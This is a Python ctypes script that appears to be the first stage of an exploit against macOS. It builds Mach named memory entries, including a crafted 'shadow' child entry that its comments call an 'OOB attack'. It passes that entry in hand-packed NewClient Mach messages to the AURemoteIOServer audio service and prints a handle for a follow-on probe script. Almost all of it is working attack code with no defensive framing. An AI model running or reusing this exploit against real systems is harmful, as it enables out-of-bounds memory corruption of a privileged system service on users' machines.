import ctypes as C, struct

# Run this when memory < 1250 MB. Output nc_hndl, then run surface_c_probe_b.py.
# Stage 1: plain named entry (protocol sanity check), then shadow ne for the real attack.

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32
t = L.mach_task_self()

M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int, C.POINTER(C.c_uint32), C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64, C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]

# === Stage 1a: Plain named entry (protocol check) ===
a0 = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a0), 0x4000, 1)
print(f"alloc0 kr={kr} va={hex(a0.value)}")
if kr != 0: raise SystemExit(1)

plain_ne = C.c_uint32(0); pns = C.c_uint64(0x4000)
kr = M(t, C.byref(pns), a0.value, 3, C.byref(plain_ne), 0)
print(f"plain_ne kr={kr} ne={plain_ne.value}")
if kr != 0: raise SystemExit(1)

# === Stage 1b: Shadow named entry (OOB attack) ===
a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
print(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0: raise SystemExit(1)

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
print(f"parent_ne kr={kr}")
if kr != 0: raise SystemExit(1)

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
print(f"child_ne kr={kr}")
if kr != 0: raise SystemExit(1)

m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
print(f"map_child kr={kr} va={hex(m.value)}")
if kr != 0: raise SystemExit(1)

q = (C.c_uint8 * 0x4000).from_address(m.value)
q[0x3000] = 0xAB

shadow_ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(shadow_ne), 0)
print(f"shadow_ne kr={kr} ne={shadow_ne.value}")
if kr != 0: raise SystemExit(1)

# === Stage 2: AURemoteIOServer lookup ===
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32.in_dll(L, "bootstrap_port").value
print(f"bootstrap_port={bs}")
svc = C.c_uint32(0)
kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: raise SystemExit(1)

COMPLEX = 0x80000000
SO_BITS = (0x14 << 8) | 0x13
CS_BITS = COMPLEX | SO_BITS
# MACH_SEND_MSG|MACH_RCV_MSG|MACH_RCV_TIMEOUT = 0x1|0x2|0x100 = 0x103
MSG_OPT = 0x103
TIMEOUT_MS = 8000

def send_new_client(ne_port, label):
    rp = L.mach_reply_port()
    buf = bytearray(0x200)
    struct.pack_into('<IIIIII', buf, 0x00, CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
    struct.pack_into('<I', buf, 0x18, 1)
    struct.pack_into('<IIHBB', buf, 0x1c, ne_port, 0, 0, 17, 0)
    buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
    print(f"[{label}] sending NewClient ne={ne_port} ...")
    kr = L.mach_msg(buf_c, MSG_OPT, 0x3c, len(buf), rp, TIMEOUT_MS, 0)
    print(f"[{label}] mach_msg kr={kr:#010x}")
    if kr != 0:
        return None
    nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
    nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
    print(f"[{label}] ret={nc_ret:#010x} handle={nc_hndl:#x}")
    return nc_hndl if nc_ret == 0 else None

# === Stage 3a: NewClient with plain ne (protocol sanity) ===
h1 = send_new_client(plain_ne.value, "plain")

# === Stage 3b: NewClient with shadow ne (OOB attack) ===
h2 = send_new_client(shadow_ne.value, "shadow")

hndl = h2 if h2 is not None else h1
if hndl is None:
    print("BOTH NewClient calls failed")
    raise SystemExit(1)

print(f"\n>>> nc_hndl = {hndl:#x}  (hardcode this in surface_c_probe_b.py) <<<\n")
